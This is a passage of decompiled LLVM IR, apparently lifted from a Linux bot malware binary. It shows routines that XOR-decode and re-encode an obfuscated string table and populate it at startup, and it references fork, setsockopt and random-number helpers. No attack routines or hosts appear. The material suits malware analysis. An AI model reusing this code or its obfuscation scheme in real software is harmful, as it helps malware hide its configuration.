  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), { 6, 56, 7, 57, 8, 58, 9, 59, 0, 60, 10, 61, 1, 62, 11, 63, 2, 64, 12, 65, 13, 66, 14, 67, 3, 68, 15, 69, 16, 70, 17, 71, 18, 72, 19, 73, 20, 74, 4, 75, 21, 76, 22, 77, 23, 78, 24, 79, 25, 80, 26, 81, 27, 82, 28, 83, 29, 84, 30, 85, 31, 86, 32, 87, 33, 88, 34, 89, 35, 90, 36, 91, 37, 92, 38, 93, 39, 94, 40, 95, 41, 96, 42, 97, 43, 98, 44, 45, 46, 99, 47, 100, 48, 101, 49, 102, 50, 103, 51, 104, 5, 105, 52, 106, 53, 107, 54, 108, 55, 109 }
  uselistorder i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), { 4, 16, 5, 17, 6, 18, 0, 19, 1, 20, 7, 21, 2, 22, 8, 23, 9, 24, 10, 25, 11, 26, 12, 27, 13, 28, 14, 29, 15, 30, 3, 31 }
  uselistorder i8* @global_var_246e1.187, { 1, 0 }
  uselistorder i16* @global_var_246d6.186, { 1, 0 }
  uselistorder i16 5888, { 1, 0, 2 }
  uselistorder i8 6, { 5, 3, 6, 7, 8, 9, 10, 0, 11, 1, 2, 4 }
  uselistorder i8 16, { 0, 1, 2, 4, 3, 12, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_246d4.181 to i32), { 1, 2, 0, 3, 4 }
  uselistorder i8* @global_var_246e0.182, { 1, 0 }
  uselistorder i8** @global_var_246c0.178, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_246c0.178 to i32), { 2, 10, 3, 1, 0, 9, 4, 8, 7, 6, 5 }
  uselistorder i32 1023, { 2, 0, 1, 3, 4 }
  uselistorder i32 ()* @rand_next, { 65, 64, 63, 62, 61, 60, 59, 3, 2, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 10, 1, 9, 8, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder i32* @global_var_271d4.176, { 1, 2, 3, 4, 0, 5 }
  uselistorder i16 254, { 1, 2, 0 }
  uselistorder i32* @global_var_271d0.174, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 288, { 2, 3, 7, 0, 1, 4, 5, 6, 8 }
  uselistorder i32* @global_var_246f0.163, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32*)* @__GI_time, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 27, 25, 26 }
  uselistorder i32 (i32)* @rand_init, { 1, 0 }
  uselistorder i32* @global_var_271b8.90, { 3, 4, 1, 2, 0, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i32 ptrtoint (i32* @global_var_271b8.90 to i32), { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 ()* @util_local_addr, { 2, 1, 0 }
  uselistorder i32* @global_var_271d8.161, { 0, 2, 1 }
  uselistorder i32 ()* @__libc_fork, { 5, 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_119f0, { 1, 0 }
  uselistorder label %bb428, { 1, 0 }
  uselistorder label %dec_label_pc_1190c, { 1, 0 }
  uselistorder label %dec_label_pc_10cc8.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10cc8.backedge.thread528, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_10cc8.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_116b0, { 1, 0 }
  uselistorder label %dec_label_pc_115e8, { 1, 0 }
  uselistorder label %dec_label_pc_115e4, { 1, 2, 3, 4, 0, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_115dc, { 1, 2, 3, 0, 4, 6, 7, 5 }
  uselistorder label %dec_label_pc_115cc, { 1, 0 }
  uselistorder label %dec_label_pc_1155c, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread114, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11528, { 1, 0 }
  uselistorder label %.thread110, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11508, { 1, 0 }
  uselistorder label %dec_label_pc_114f4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_114b0, { 1, 0 }
  uselistorder label %dec_label_pc_114b0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_11490, { 5, 3, 4, 1, 0, 6, 2 }
  uselistorder label %dec_label_pc_1145c, { 1, 0 }
  uselistorder label %thread-pre-split103, { 1, 0 }
  uselistorder label %dec_label_pc_1140c, { 1, 0 }
  uselistorder label %dec_label_pc_11324, { 1, 0 }
  uselistorder label %dec_label_pc_11258, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_11240, { 1, 0 }
  uselistorder label %dec_label_pc_11184, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_1116c, { 1, 0 }
  uselistorder label %dec_label_pc_110b0, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_11098, { 1, 0 }
  uselistorder label %dec_label_pc_10fdc, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_10fc4, { 1, 0 }
  uselistorder label %dec_label_pc_10f08, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_10ef0, { 1, 0 }
  uselistorder label %dec_label_pc_10dd0, { 6, 1, 7, 3, 0, 2, 4, 5 }
  uselistorder label %bb390, { 1, 0 }
  uselistorder label %bb388, { 1, 0 }
  uselistorder label %dec_label_pc_10d94, { 1, 0 }
  uselistorder label %dec_label_pc_10d2c, { 1, 0 }
  uselistorder label %.thread63, { 1, 0 }
  uselistorder label %dec_label_pc_10ce0, { 1, 0 }
  uselistorder label %dec_label_pc_10cd0, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10cd0.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_10ca8, { 1, 0 }
  uselistorder label %dec_label_pc_10c00, { 1, 0 }
  uselistorder label %bb384, { 1, 0 }
  uselistorder label %bb382, { 1, 0 }
  uselistorder label %bb380, { 1, 0 }
  uselistorder label %bb378, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_10af4.dec_label_pc_10af4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10ad4.dec_label_pc_10ad4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10ac8, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10ac0, { 1, 0 }
  uselistorder label %dec_label_pc_10a9c, { 1, 0 }
  uselistorder label %dec_label_pc_10a78, { 1, 0 }
  uselistorder label %dec_label_pc_1092c, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_10918, { 1, 0 }
  uselistorder label %.thread39, { 1, 0 }
  uselistorder label %dec_label_pc_107a4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10780, { 1, 0 }
  uselistorder label %dec_label_pc_10774, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10750, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1072c, { 1, 0 }
  uselistorder label %bb350, { 1, 0 }
  uselistorder label %dec_label_pc_106d8, { 22, 6, 7, 2, 8, 3, 9, 4, 10, 5, 11, 0, 12, 13, 14, 15, 16, 17, 18, 19, 1, 20, 21, 23 }
  uselistorder label %dec_label_pc_f9b4, { 1, 0 }
}

define i32 @table_retrieve_val(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_271e0.552 to i32), i32* @r2, align 4
  %v3_119fc = mul i32 %arg1, 8
  %v2_11a00 = add i32 %v3_119fc, ptrtoint (i32* @global_var_271e0.552 to i32)
  store i32 %v2_11a00, i32* @r3, align 4
  %v2_11a04 = icmp eq i32* %arg2, null
  br i1 %v2_11a04, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_11a0c4 = inttoptr i32 %v2_11a00 to i32*
  %v4_11a0c5 = load i32, i32* %v3_11a0c4, align 4
  br label %bb7

bb:                                               ; preds = %entry
  %v2_11a08 = add i32 %v3_119fc, add (i32 ptrtoint (i32* @global_var_271e0.552 to i32), i32 4)
  %v3_11a08 = inttoptr i32 %v2_11a08 to i16*
  %v4_11a08 = load i16, i16* %v3_11a08, align 4
  %v5_11a08 = zext i16 %v4_11a08 to i32
  store i32 %v5_11a08, i32* @r3, align 4
  %v3_11a0c = inttoptr i32 %v2_11a00 to i32*
  %v4_11a0c = load i32, i32* %v3_11a0c, align 4
  store i32 %v5_11a08, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_11a0c6 = phi i32 [ %v4_11a0c5, %.thread ], [ %v4_11a0c, %bb ]
  ret i32 %v4_11a0c6

; uselistorder directives
  uselistorder i32 %v2_11a00, { 1, 0, 2 }
  uselistorder i32 %v3_119fc, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @table_lock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11a24 = mul i32 %arg1, 8
  %v2_11a28 = add i32 %v3_11a24, ptrtoint (i32* @global_var_271e0.552 to i32)
  %v2_11a2c = load i32, i32* @global_var_24530.555, align 4
  store i32 %v2_11a2c, i32* @r1, align 4
  %v1_11a30 = add i32 %v3_11a24, add (i32 ptrtoint (i32* @global_var_271e0.552 to i32), i32 4)
  %v2_11a30 = inttoptr i32 %v1_11a30 to i16*
  %v3_11a30 = load i16, i16* %v2_11a30, align 4
  %v3_11a34 = udiv i32 %v2_11a2c, 256
  store i32 %v3_11a34, i32* @r2, align 4
  %v2_11a38 = icmp eq i16 %v3_11a30, 0
  %v3_11a3c = udiv i32 %v2_11a2c, 65536
  store i32 %v3_11a3c, i32* @r3, align 4
  %v3_11a40 = load i32, i32* @r4, align 4
  store i32 %v3_11a40, i32* %stack_var_-16, align 4
  %v1_11a44 = urem i32 %v3_11a34, 256
  store i32 %v1_11a44, i32* %r6.global-to-local, align 4
  %v1_11a48 = urem i32 %v3_11a3c, 256
  store i32 %v1_11a48, i32* %r5.global-to-local, align 4
  %v3_11a4c = udiv i32 %v2_11a2c, 16777216
  store i32 %v3_11a4c, i32* %r4.global-to-local, align 4
  %v1_11a50 = urem i32 %v2_11a2c, 256
  store i32 %v1_11a50, i32* %lr.global-to-local, align 4
  br i1 %v2_11a38, label %dec_label_pc_11aac, label %dec_label_pc_11a58

dec_label_pc_11a58:                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_11a5c = inttoptr i32 %v2_11a28 to i32*
  br label %dec_label_pc_11a5c

dec_label_pc_11a5c:                               ; preds = %dec_label_pc_11a5c.dec_label_pc_11a5c_crit_edge, %dec_label_pc_11a58
  %v0_11a64 = phi i32 [ %v0_11a64.pre, %dec_label_pc_11a5c.dec_label_pc_11a5c_crit_edge ], [ %v1_11a50, %dec_label_pc_11a58 ]
  %v2_11a68 = phi i32 [ %v1_11aa0, %dec_label_pc_11a5c.dec_label_pc_11a5c_crit_edge ], [ 0, %dec_label_pc_11a58 ]
  %v2_11a5c = load i32, i32* %v1_11a5c, align 4
  %v2_11a60 = add i32 %v2_11a5c, %v2_11a68
  %v3_11a60 = inttoptr i32 %v2_11a60 to i8*
  %v4_11a60 = load i8, i8* %v3_11a60, align 1
  %v6_11a60 = zext i8 %v4_11a60 to i32
  %v2_11a64 = xor i32 %v6_11a60, %v0_11a64
  %v1_11a68 = trunc i32 %v2_11a64 to i8
  store i8 %v1_11a68, i8* %v3_11a60, align 1
  %v2_11a6c = load i32, i32* %v1_11a5c, align 4
  %v0_11a70 = load i32, i32* @ip, align 4
  %v2_11a70 = add i32 %v0_11a70, %v2_11a6c
  %v3_11a70 = inttoptr i32 %v2_11a70 to i8*
  %v4_11a70 = load i8, i8* %v3_11a70, align 1
  %v6_11a70 = zext i8 %v4_11a70 to i32
  %v0_11a74 = load i32, i32* %r6.global-to-local, align 4
  %v2_11a74 = xor i32 %v0_11a74, %v6_11a70
  %v1_11a78 = trunc i32 %v2_11a74 to i8
  store i8 %v1_11a78, i8* %v3_11a70, align 1
  %v2_11a7c = load i32, i32* %v1_11a5c, align 4
  %v0_11a80 = load i32, i32* @ip, align 4
  %v2_11a80 = add i32 %v0_11a80, %v2_11a7c
  %v3_11a80 = inttoptr i32 %v2_11a80 to i8*
  %v4_11a80 = load i8, i8* %v3_11a80, align 1
  %v6_11a80 = zext i8 %v4_11a80 to i32
  %v0_11a84 = load i32, i32* %r5.global-to-local, align 4
  %v2_11a84 = xor i32 %v0_11a84, %v6_11a80
  %v1_11a88 = trunc i32 %v2_11a84 to i8
  store i8 %v1_11a88, i8* %v3_11a80, align 1
  %v2_11a8c = load i32, i32* %v1_11a5c, align 4
  store i32 %v2_11a8c, i32* @r1, align 4
  %v0_11a90 = load i32, i32* @ip, align 4
  %v2_11a90 = add i32 %v0_11a90, %v2_11a8c
  %v3_11a90 = inttoptr i32 %v2_11a90 to i8*
  %v4_11a90 = load i8, i8* %v3_11a90, align 1
  %v6_11a90 = zext i8 %v4_11a90 to i32
  %v0_11a94 = load i32, i32* %r4.global-to-local, align 4
  %v2_11a94 = xor i32 %v0_11a94, %v6_11a90
  store i32 %v2_11a94, i32* @r3, align 4
  %v1_11a98 = trunc i32 %v2_11a94 to i8
  store i8 %v1_11a98, i8* %v3_11a90, align 1
  %v3_11a9c = load i16, i16* %v2_11a30, align 4
  %v4_11a9c = zext i16 %v3_11a9c to i32
  store i32 %v4_11a9c, i32* @r2, align 4
  %v0_11aa0 = load i32, i32* @ip, align 4
  %v1_11aa0 = add i32 %v0_11aa0, 1
  store i32 %v1_11aa0, i32* @ip, align 4
  %v8_11aa8 = icmp sgt i32 %v4_11a9c, %v1_11aa0
  br i1 %v8_11aa8, label %dec_label_pc_11a5c.dec_label_pc_11a5c_crit_edge, label %dec_label_pc_11aac.loopexit

dec_label_pc_11a5c.dec_label_pc_11a5c_crit_edge:  ; preds = %dec_label_pc_11a5c
  %v0_11a64.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_11a5c

dec_label_pc_11aac.loopexit:                      ; preds = %dec_label_pc_11a5c
  %v2_11aac.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_11aac

dec_label_pc_11aac:                               ; preds = %dec_label_pc_11aac.loopexit, %entry
  %v2_11aac = phi i32 [ %v2_11aac.pre, %dec_label_pc_11aac.loopexit ], [ %v3_11a40, %entry ]
  store i32 %v2_11aac, i32* @r4, align 4
  ret i32 %v2_11a28

; uselistorder directives
  uselistorder i32 %v1_11aa0, { 1, 2, 0 }
  uselistorder i32 %v1_11a50, { 1, 0 }
  uselistorder i32 %v3_11a3c, { 1, 0 }
  uselistorder i32 %v3_11a34, { 1, 0 }
  uselistorder i32 %v2_11a2c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_11a24, { 1, 0 }
}

define i32 @table_unlock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11ac4 = mul i32 %arg1, 8
  %v2_11ac8 = add i32 %v3_11ac4, ptrtoint (i32* @global_var_271e0.552 to i32)
  %v2_11acc = load i32, i32* @global_var_24530.555, align 4
  %v1_11ad0 = add i32 %v3_11ac4, add (i32 ptrtoint (i32* @global_var_271e0.552 to i32), i32 4)
  %v2_11ad0 = inttoptr i32 %v1_11ad0 to i16*
  %v3_11ad0 = load i16, i16* %v2_11ad0, align 4
  %v3_11ad4 = udiv i32 %v2_11acc, 256
  %v2_11ad8 = icmp eq i16 %v3_11ad0, 0
  %v3_11adc = udiv i32 %v2_11acc, 65536
  store i32 %v3_11adc, i32* @r3, align 4
  %v3_11ae0 = load i32, i32* @r4, align 4
  store i32 %v3_11ae0, i32* %stack_var_-16, align 4
  %v1_11ae4 = urem i32 %v3_11ad4, 256
  store i32 %v1_11ae4, i32* %r6.global-to-local, align 4
  %v1_11ae8 = urem i32 %v3_11adc, 256
  store i32 %v1_11ae8, i32* %r5.global-to-local, align 4
  %v3_11aec = udiv i32 %v2_11acc, 16777216
  store i32 %v3_11aec, i32* %r4.global-to-local, align 4
  %v1_11af0 = urem i32 %v2_11acc, 256
  store i32 %v1_11af0, i32* %lr.global-to-local, align 4
  br i1 %v2_11ad8, label %dec_label_pc_11b4c, label %dec_label_pc_11af8

dec_label_pc_11af8:                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_11afc = inttoptr i32 %v2_11ac8 to i32*
  br label %dec_label_pc_11afc

dec_label_pc_11afc:                               ; preds = %dec_label_pc_11afc.dec_label_pc_11afc_crit_edge, %dec_label_pc_11af8
  %v0_11b04 = phi i32 [ %v0_11b04.pre, %dec_label_pc_11afc.dec_label_pc_11afc_crit_edge ], [ %v1_11af0, %dec_label_pc_11af8 ]
  %v2_11b08 = phi i32 [ %v1_11b40, %dec_label_pc_11afc.dec_label_pc_11afc_crit_edge ], [ 0, %dec_label_pc_11af8 ]
  %v2_11afc = load i32, i32* %v1_11afc, align 4
  %v2_11b00 = add i32 %v2_11afc, %v2_11b08
  %v3_11b00 = inttoptr i32 %v2_11b00 to i8*
  %v4_11b00 = load i8, i8* %v3_11b00, align 1
  %v6_11b00 = zext i8 %v4_11b00 to i32
  %v2_11b04 = xor i32 %v6_11b00, %v0_11b04
  %v1_11b08 = trunc i32 %v2_11b04 to i8
  store i8 %v1_11b08, i8* %v3_11b00, align 1
  %v2_11b0c = load i32, i32* %v1_11afc, align 4
  %v0_11b10 = load i32, i32* @ip, align 4
  %v2_11b10 = add i32 %v0_11b10, %v2_11b0c
  %v3_11b10 = inttoptr i32 %v2_11b10 to i8*
  %v4_11b10 = load i8, i8* %v3_11b10, align 1
  %v6_11b10 = zext i8 %v4_11b10 to i32
  %v0_11b14 = load i32, i32* %r6.global-to-local, align 4
  %v2_11b14 = xor i32 %v0_11b14, %v6_11b10
  %v1_11b18 = trunc i32 %v2_11b14 to i8
  store i8 %v1_11b18, i8* %v3_11b10, align 1
  %v2_11b1c = load i32, i32* %v1_11afc, align 4
  %v0_11b20 = load i32, i32* @ip, align 4
  %v2_11b20 = add i32 %v0_11b20, %v2_11b1c
  %v3_11b20 = inttoptr i32 %v2_11b20 to i8*
  %v4_11b20 = load i8, i8* %v3_11b20, align 1
  %v6_11b20 = zext i8 %v4_11b20 to i32
  %v0_11b24 = load i32, i32* %r5.global-to-local, align 4
  %v2_11b24 = xor i32 %v0_11b24, %v6_11b20
  %v1_11b28 = trunc i32 %v2_11b24 to i8
  store i8 %v1_11b28, i8* %v3_11b20, align 1
  %v2_11b2c = load i32, i32* %v1_11afc, align 4
  %v0_11b30 = load i32, i32* @ip, align 4
  %v2_11b30 = add i32 %v0_11b30, %v2_11b2c
  %v3_11b30 = inttoptr i32 %v2_11b30 to i8*
  %v4_11b30 = load i8, i8* %v3_11b30, align 1
  %v6_11b30 = zext i8 %v4_11b30 to i32
  %v0_11b34 = load i32, i32* %r4.global-to-local, align 4
  %v2_11b34 = xor i32 %v0_11b34, %v6_11b30
  store i32 %v2_11b34, i32* @r3, align 4
  %v1_11b38 = trunc i32 %v2_11b34 to i8
  store i8 %v1_11b38, i8* %v3_11b30, align 1
  %v3_11b3c = load i16, i16* %v2_11ad0, align 4
  %v4_11b3c = zext i16 %v3_11b3c to i32
  %v0_11b40 = load i32, i32* @ip, align 4
  %v1_11b40 = add i32 %v0_11b40, 1
  store i32 %v1_11b40, i32* @ip, align 4
  %v8_11b48 = icmp sgt i32 %v4_11b3c, %v1_11b40
  br i1 %v8_11b48, label %dec_label_pc_11afc.dec_label_pc_11afc_crit_edge, label %dec_label_pc_11b4c.loopexit

dec_label_pc_11afc.dec_label_pc_11afc_crit_edge:  ; preds = %dec_label_pc_11afc
  %v0_11b04.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_11afc

dec_label_pc_11b4c.loopexit:                      ; preds = %dec_label_pc_11afc
  %v2_11b4c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_11b4c

dec_label_pc_11b4c:                               ; preds = %dec_label_pc_11b4c.loopexit, %entry
  %v2_11b4c = phi i32 [ %v2_11b4c.pre, %dec_label_pc_11b4c.loopexit ], [ %v3_11ae0, %entry ]
  store i32 %v2_11b4c, i32* @r4, align 4
  ret i32 %v2_11ac8

; uselistorder directives
  uselistorder i32 %v1_11b40, { 1, 2, 0 }
  uselistorder i32 %v1_11af0, { 1, 0 }
  uselistorder i32 %v3_11adc, { 1, 0 }
  uselistorder i32 %v2_11acc, { 3, 0, 1, 2 }
  uselistorder i32 %v3_11ac4, { 1, 0 }
}

define i32 @table_init(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v3_11b5c = load i32, i32* @r4, align 4
  %v6_11b5c = load i32, i32* @r5, align 4
  %v9_11b5c = load i32, i32* @r6, align 4
  %v12_11b5c = load i32, i32* @r7, align 4
  %v15_11b5c = load i32, i32* @r8, align 4
  %v21_11b5c = load i32, i32* @sl, align 4
  %v24_11b5c = load i32, i32* @fp, align 4
  store i32 2, i32* @r0, align 4
  %v0_11b68 = call i32 @malloc()
  store i32 2, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_271e0.552 to i32), i32* @r4, align 4
  store i32 %v0_11b68, i32* @r6, align 4
  %v4_11b80 = call i32 @util_memcpy(i32 %v0_11b68, i32 ptrtoint ([3 x i8]* @global_var_1b9dc.560 to i32), i32 2)
  %v0_11b84 = load i32, i32* @r5, align 4
  store i32 %v0_11b84, i32* @r0, align 4
  %v0_11b88 = load i32, i32* @r6, align 4
  store i32 %v0_11b88, i32* @global_var_271f0.561, align 4
  %v1_11b8c = trunc i32 %v0_11b84 to i16
  store i16 %v1_11b8c, i16* bitcast (i32* @global_var_271f4.562 to i16*), align 4
  %v0_11b90 = call i32 @malloc()
  %v0_11b94 = load i32, i32* @r5, align 4
  store i32 %v0_11b90, i32* @r6, align 4
  %v3_11ba0 = call i32 @util_memcpy(i32 %v0_11b90, i32 ptrtoint (i32* @global_var_1b9e0.564 to i32), i32 %v0_11b94)
  store i32 29, i32* @r0, align 4
  %v0_11ba8 = load i32, i32* @r6, align 4
  store i32 %v0_11ba8, i32* @global_var_27200.565, align 4
  %v0_11bac = load i32, i32* @r5, align 4
  %v1_11bac = trunc i32 %v0_11bac to i16
  store i16 %v1_11bac, i16* bitcast (i32* @global_var_27204.566 to i16*), align 4
  %v0_11bb0 = call i32 @malloc()
  store i32 %v0_11bb0, i32* @r5, align 4
  %v3_11bc0 = call i32 @util_memcpy(i32 %v0_11bb0, i32 ptrtoint (i32* @global_var_1b9e4.568 to i32), i32 29)
  store i32 7, i32* @r0, align 4
  %v0_11bcc = load i32, i32* @r5, align 4
  store i32 %v0_11bcc, i32* @global_var_27208.569, align 4
  store i16 29, i16* bitcast (i32* @global_var_2720c.570 to i16*), align 4
  %v0_11bd4 = call i32 @malloc()
  store i32 7, i32* @r6, align 4
  store i32 %v0_11bd4, i32* @r5, align 4
  %v3_11be8 = call i32 @util_memcpy(i32 %v0_11bd4, i32 ptrtoint (i32* @global_var_1ba04.572 to i32), i32 7)
  store i32 5, i32* @r0, align 4
  %v0_11bf0 = load i32, i32* @r5, align 4
  store i32 %v0_11bf0, i32* @global_var_27210.573, align 4
  %v0_11bf4 = load i32, i32* @r6, align 4
  %v1_11bf4 = trunc i32 %v0_11bf4 to i16
  store i16 %v1_11bf4, i16* bitcast (i32* @global_var_27214.574 to i16*), align 4
  %v0_11bf8 = call i32 @malloc()
  store i32 %v0_11bf8, i32* @r5, align 4
  %v3_11c08 = call i32 @util_memcpy(i32 %v0_11bf8, i32 ptrtoint (i32* @global_var_1ba0c.576 to i32), i32 5)
  store i32 4, i32* @r0, align 4
  store i16 5, i16* bitcast (i32* @global_var_2721c.577 to i16*), align 4
  %v0_11c18 = load i32, i32* @r5, align 4
  store i32 %v0_11c18, i32* @global_var_27218.578, align 4
  %v0_11c1c = call i32 @malloc()
  store i32 %v0_11c1c, i32* @r5, align 4
  %v3_11c2c = call i32 @util_memcpy(i32 %v0_11c1c, i32 ptrtoint (i32* @global_var_1ba14.580 to i32), i32 4)
  store i32 14, i32* @r0, align 4
  %v0_11c38 = load i32, i32* @r5, align 4
  store i32 %v0_11c38, i32* @global_var_27220.581, align 4
  store i16 4, i16* bitcast (i32* @global_var_27224.582 to i16*), align 4
  %v0_11c40 = call i32 @malloc()
  store i32 %v0_11c40, i32* @r5, align 4
  %v3_11c50 = call i32 @util_memcpy(i32 %v0_11c40, i32 ptrtoint (i32* @global_var_1ba1c.584 to i32), i32 14)
  store i32 6, i32* @r0, align 4
  store i16 14, i16* bitcast (i32* @global_var_2722c.585 to i16*), align 4
  %v0_11c60 = load i32, i32* @r5, align 4
  store i32 %v0_11c60, i32* @global_var_27228.586, align 4
  %v0_11c64 = call i32 @malloc()
  store i32 6, i32* @r7, align 4
  store i32 %v0_11c64, i32* @r5, align 4
  %v3_11c78 = call i32 @util_memcpy(i32 %v0_11c64, i32 ptrtoint (i32* @global_var_1ba2c.588 to i32), i32 6)
  store i32 8, i32* @r0, align 4
  %v0_11c80 = load i32, i32* @r5, align 4
  store i32 %v0_11c80, i32* @global_var_27230.589, align 4
  %v0_11c84 = load i32, i32* @r7, align 4
  %v1_11c84 = trunc i32 %v0_11c84 to i16
  store i16 %v1_11c84, i16* bitcast (i32* @global_var_27234.590 to i16*), align 4
  %v0_11c88 = call i32 @malloc()
  store i32 8, i32* @sl, align 4
  store i32 %v0_11c88, i32* @r5, align 4
  %v3_11c9c = call i32 @util_memcpy(i32 %v0_11c88, i32 ptrtoint (i32* @global_var_1ba34.592 to i32), i32 8)
  %v0_11ca0 = load i32, i32* @r6, align 4
  store i32 %v0_11ca0, i32* @r0, align 4
  %v0_11ca4 = load i32, i32* @r5, align 4
  store i32 %v0_11ca4, i32* @global_var_27238.593, align 4
  %v0_11ca8 = load i32, i32* @sl, align 4
  %v1_11ca8 = trunc i32 %v0_11ca8 to i16
  store i16 %v1_11ca8, i16* bitcast (i32* @global_var_2723c.594 to i16*), align 4
  %v0_11cac = call i32 @malloc()
  %v0_11cb0 = load i32, i32* @r6, align 4
  store i32 %v0_11cac, i32* @r5, align 4
  %v3_11cbc = call i32 @util_memcpy(i32 %v0_11cac, i32 ptrtoint (i32* @global_var_1ba40.596 to i32), i32 %v0_11cb0)
  store i32 16, i32* @r0, align 4
  %v0_11cc4 = load i32, i32* @r5, align 4
  store i32 %v0_11cc4, i32* @global_var_27240.597, align 4
  %v0_11cc8 = load i32, i32* @r6, align 4
  %v1_11cc8 = trunc i32 %v0_11cc8 to i16
  store i16 %v1_11cc8, i16* bitcast (i32* @global_var_27244.598 to i16*), align 4
  %v0_11ccc = call i32 @malloc()
  store i32 %v0_11ccc, i32* @r5, align 4
  %v3_11cdc = call i32 @util_memcpy(i32 %v0_11ccc, i32 ptrtoint (i32* @global_var_1ba48.600 to i32), i32 16)
  store i32 14, i32* @r0, align 4
  %v0_11ce8 = load i32, i32* @r5, align 4
  store i32 %v0_11ce8, i32* @global_var_27248.601, align 4
  store i16 16, i16* bitcast (i32* @global_var_2724c.602 to i16*), align 4
  %v0_11cf0 = call i32 @malloc()
  store i32 %v0_11cf0, i32* @r5, align 4
  %v3_11d00 = call i32 @util_memcpy(i32 %v0_11cf0, i32 ptrtoint (i32* @global_var_1ba5c.604 to i32), i32 14)
  store i32 9, i32* @r0, align 4
  store i16 14, i16* bitcast (i32* @global_var_27254.605 to i16*), align 4
  %v0_11d10 = load i32, i32* @r5, align 4
  store i32 %v0_11d10, i32* @global_var_27250.606, align 4
  %v0_11d14 = call i32 @malloc()
  store i32 9, i32* @sb, align 4
  store i32 %v0_11d14, i32* @r5, align 4
  %v3_11d28 = call i32 @util_memcpy(i32 %v0_11d14, i32 ptrtoint (i32* @global_var_1ba6c.608 to i32), i32 9)
  store i32 19, i32* @r0, align 4
  %v0_11d30 = load i32, i32* @r5, align 4
  store i32 %v0_11d30, i32* @global_var_27258.609, align 4
  %v0_11d34 = load i32, i32* @sb, align 4
  %v1_11d34 = trunc i32 %v0_11d34 to i16
  store i16 %v1_11d34, i16* bitcast (i32* @global_var_2725c.610 to i16*), align 4
  %v0_11d38 = call i32 @malloc()
  store i32 19, i32* @fp, align 4
  store i32 %v0_11d38, i32* @r5, align 4
  %v3_11d4c = call i32 @util_memcpy(i32 %v0_11d38, i32 ptrtoint (i32* @global_var_1ba78.612 to i32), i32 19)
  store i32 23, i32* @r0, align 4
  %v0_11d54 = load i32, i32* @r5, align 4
  store i32 %v0_11d54, i32* @global_var_27260.613, align 4
  %v0_11d58 = load i32, i32* @fp, align 4
  %v1_11d58 = trunc i32 %v0_11d58 to i16
